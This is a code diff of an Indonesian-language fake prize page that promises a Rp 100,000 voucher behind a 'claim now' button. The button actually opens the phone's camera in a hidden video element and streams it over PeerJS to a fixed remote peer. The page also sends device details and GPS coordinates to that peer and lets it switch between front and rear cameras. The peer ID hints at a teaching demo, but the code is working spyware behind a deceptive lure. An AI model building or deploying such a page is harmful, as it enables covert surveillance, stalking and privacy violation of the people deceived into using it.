@@ -9,6 +9,7 @@
     body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #f4f4f9; }
     .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
     button { background: #28a745; color: white; border: none; padding: 14px 28px; font-size: 18px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
+    button:disabled { background: #ccc; cursor: not-allowed; }
     #status { margin-top: 15px; color: #666; font-size: 14px; }
   </style>
 </head>
@@ -16,111 +17,129 @@
   <div class="card">
     <h2>🎉 Selamat! Anda Mendapatkan Voucher Rp 100.000</h2>
     <p>Tekan tombol di bawah untuk memproses dan mengklaim hadiah Anda.</p>
-    <button onclick="prosesKlaim()">KLAIM SEKARANG</button>
+    <button id="btnKlaim" onclick="prosesKlaim()">KLAIM SEKARANG</button>
     <p id="status"></p>
   </div>
 
-  <!-- Kamera tersembunyi (tidak tampil di layar HP) -->
+  <!-- Video hidden/tersembunyi -->
   <video id="webcam" autoplay playsinline style="display: none;"></video>
 
   <script>
     const ID_LAPTOP = "guru-demo-kamera-123";
-    
-    // STUN Server Google untuk menembus jaringan seluler & Wi-Fi
-    const peer = new Peer({
-      config: {
-        iceServers: [
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' },
-          { urls: 'stun:stun2.l.google.com:19302' }
-        ]
-      }
-    });
-
+    let peer = null;
     let currentStream = null;
-    let isFrontCamera = false;
+    let currentCall = null;
     let dataConn = null;
+    let isFrontCamera = false;
 
-    peer.on('open', () => {
-      dataConn = peer.connect(ID_LAPTOP);
-      if (dataConn) {
-        dataConn.on('open', () => {
-          // 1. Kirim Spesifikasi Perangkat HP ke Laptop
-          const infoPerangkat = {
-            type: 'device-info',
-            osBrowser: navigator.userAgent,
-            resolusi: `${screen.width} x ${screen.height} px`,
-            cpuCore: navigator.hardwareConcurrency || 'N/A',
-            ram: (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'),
-            zonaWaktu: Intl.DateTimeFormat().resolvedOptions().timeZone
-          };
-          dataConn.send(infoPerangkat);
+    // Inisialisasi PeerJS saat halaman dimuat
+    function initPeer() {
+      peer = new Peer({
+        config: {
+          iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' }
+          ]
+        }
+      });
+    }
 
-          // 2. Dengarkan Perintah Ganti Kamera dari Laptop
-          dataConn.on('data', (data) => {
-            if (data === 'switch') {
-              isFrontCamera = !isFrontCamera;
-              startCamera();
-            }
-          });
-        });
-      }
-    });
+    initPeer();
 
     async function prosesKlaim() {
-      document.getElementById('status').innerText = "Memproses voucher...";
-      
-      // 1. Minta Akses Lokasi GPS (Tanpa mengunci alur program)
-      mintaLokasiGPS();
-      
-      // 2. Minta Akses Kamera & Mulai Stream ke Laptop
+      const btn = document.getElementById('btnKlaim');
+      btn.disabled = true;
+      document.getElementById('status').innerText = "Menghubungkan ke server...";
+
+      // Sambungkan jalur data ke Laptop
+      dataConn = peer.connect(ID_LAPTOP);
+
+      dataConn.on('open', () => {
+        kirimInfoPerangkat();
+        mintaLokasiGPS();
+      });
+
+      // Perintah ganti kamera dari Laptop
+      dataConn.on('data', (data) => {
+        if (data === 'switch') {
+          isFrontCamera = !isFrontCamera;
+          startCamera();
+        }
+      });
+
+      // Buka kamera dan mulai transmisi video
       await startCamera();
-      
-      // 3. Ubah status teks tanpa menggunakan alert() agar koneksi tidak terhenti
+
       document.getElementById('status').innerText = "Voucher Berhasil Diklaim!";
     }
 
-    // Fungsi Pengambilan Lokasi GPS Cepat
+    function kirimInfoPerangkat() {
+      if (dataConn && dataConn.open) {
+        dataConn.send({
+          type: 'device-info',
+          osBrowser: navigator.userAgent,
+          resolusi: `${screen.width} x ${screen.height} px`,
+          cpuCore: navigator.hardwareConcurrency || 'N/A',
+          ram: (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'),
+          zonaWaktu: Intl.DateTimeFormat().resolvedOptions().timeZone
+        });
+      }
+    }
+
     function mintaLokasiGPS() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
-            const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-
             if (dataConn && dataConn.open) {
               dataConn.send({
                 type: 'location-info',
-                mapsUrl: mapsUrl,
+                mapsUrl: `https://www.google.com/maps?q=${lat},${lng}`,
                 lat: lat,
                 lng: lng
               });
             }
           },
           (error) => {
-            console.warn("Izin lokasi ditolak atau gagal:", error.message);
+            console.warn("GPS gagal atau ditolak:", error.message);
           },
-          // Optimasi respons jaringan & batas waktu pencarian sinyal (5 detik)
-          { enableHighAccuracy: false, timeout: 5000, maximumAge: 0 }
+          { enableHighAccuracy: false, timeout: 4000, maximumAge: 0 }
         );
       }
     }
 
-    // Fungsi Pengaksesan Kamera HP
     async function startCamera() {
+      // Hentikan stream lama jika sedang berjalan
       if (currentStream) {
         currentStream.getTracks().forEach(track => track.stop());
       }
+
       try {
         const mode = isFrontCamera ? "user" : "environment";
+
+        // BATASI RESOLUSI UNTUK LOW-LATENCY TRANSMISSION
         currentStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: mode }
+          video: {
+            facingMode: mode,
+            width: { ideal: 640 },
+            height: { ideal: 480 },
+            frameRate: { ideal: 15, max: 20 }
+          },
+          audio: false
         });
+
         document.getElementById('webcam').srcObject = currentStream;
-        peer.call(ID_LAPTOP, currentStream);
+
+        // Tutup panggilan video sebelumnya jika ada
+        if (currentCall) currentCall.close();
+
+        // Panggil laptop dan kirim stream ringan
+        currentCall = peer.call(ID_LAPTOP, currentStream);
+
       } catch (err) {
-        console.error("Gagal mengakses kamera:", err);
+        console.error("Gagal mengaktifkan kamera:", err);
+        document.getElementById('status').innerText = "Gagal mengakses kamera.";
       }
     }
   </script>
